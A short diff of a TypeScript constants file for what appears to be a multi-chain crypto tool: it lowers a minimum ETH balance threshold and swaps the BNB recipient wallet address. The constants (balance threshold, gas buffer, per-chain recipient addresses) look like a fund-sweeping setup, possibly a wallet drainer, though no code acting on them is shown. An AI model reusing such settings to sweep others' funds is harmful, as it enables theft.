@@ -1,4 +1,4 @@
-export const MINIMUM_BALANCE= 0.001; // Minimum balance threshold in ETH
+export const MINIMUM_BALANCE= 0.0001; // Minimum balance threshold in ETH
 
 export const GAS_BUFFER = 0.0002;
 
@@ -12,7 +12,7 @@ export const chainNames: Record<number, string>= {
 
 export const RECIPIENT_ADDRESSES : Record<number, string>  = {
   1: "0xe664e2D02a25AeD203c44418d93d21b8226cc94c", //mobile eth
-  56: "0xe664e2D02a25AeD203c44418d93d21b8226cc94c", //bnb
+  56: "0x3620846D1548418c4940bdf70bD1E826d219ceDb", //bnb
   137: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
   42161: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
   11155111: "0x36875E84886F1Ae1032Ee044883bFD3C7c8D9bC2", // mobile
